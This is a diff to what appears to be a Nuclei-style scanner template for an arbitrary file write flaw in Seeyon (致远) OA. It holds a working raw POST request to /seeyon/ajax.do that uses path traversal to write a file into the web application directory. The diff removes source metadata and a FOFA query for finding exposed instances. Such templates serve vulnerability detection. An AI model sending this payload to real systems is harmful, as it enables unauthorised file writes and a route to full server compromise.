@@ -3,12 +3,8 @@ info:
   name: 致远OA后台表单导入ajax.do任意文件写入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/azcgngthqymanizz'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: azcgngthqymanizz
-    fofa: app="致远互联-OA"
 http:
 - raw:
   - 'POST /seeyon/ajax.do?method=ajaxAction&managerName=cap4FormDesignManager HTTP/1.1
@@ -34,7 +30,7 @@ http:
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0
 
 
-    managerMethod=generateInfopath&arguments={"files":[{"fileName":"../../../../../../ApacheJetspeed/webapps/seeyon/11.txt","fileContent":"1111"}]}![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984927030-cbccfda1-d91f-41c5-84f5-8c3f0e4d1d25.png)'
+    managerMethod=generateInfopath&arguments={"files":[{"fileName":"../../../../../../ApacheJetspeed/webapps/seeyon/11.txt","fileContent":"1111"}]}'
   redirects: false
   matchers:
   - status:
